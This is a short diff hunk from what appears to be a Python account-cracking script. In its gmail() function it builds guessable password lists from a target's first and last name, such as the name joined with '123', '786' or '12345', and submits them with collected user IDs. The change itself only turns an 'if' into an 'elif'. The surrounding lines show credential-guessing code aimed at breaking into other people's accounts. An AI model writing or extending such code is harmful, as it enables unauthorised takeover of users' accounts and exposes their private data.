@@ -697,7 +697,7 @@ def gmail():
                         fs = first_name.lower()
                         ls = last_name.lower()
                         passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
-			if zew in ['1','01']:
+			elif zew in ['1','01']:
 				yaari.submit(m1,ids,passlist)
 			elif zew in ['2','02']:
 				yaari.submit(m2,ids,passlist)
